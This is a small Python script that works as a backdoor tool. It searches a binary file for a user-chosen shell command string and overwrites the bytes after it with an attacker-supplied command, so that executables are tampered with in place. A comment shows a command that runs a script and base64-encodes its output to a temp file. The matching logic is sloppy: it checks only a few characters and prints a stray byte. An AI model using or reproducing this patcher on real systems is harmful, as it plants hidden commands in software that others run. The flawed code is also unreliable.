print("I suggest you read the pdf that came with it")
command = input("Please enter the shell command you want to backdoor:")
bd = input("Enter the command youn want to add:")
fil = input("Please enter the file you want to backdoor:")
f = open(fil,"rb")
data = f.read()
data = bytearray(data)
f.close()
#bash /tmp/command.sh | base64 > /tmp/output.txt
i = 0
l = len(command)
l = l-1
for d in data:
    if d == ord(command[0]):
        if data[i+1] == ord(command[1]):
            if data[i+2] == ord(command[2]):
                if data[i+l] == ord(command[l]):
                    print(chr(data[i+26]))
                    i = i+l
                    k = i-l
                    break
    i=i+1
i = i+1
j=0
for b in bd:
    data[i] = ord(b)
    i = i+1
data[i] = 0
f = open(fil,"wb")
f.write(data)
f.close()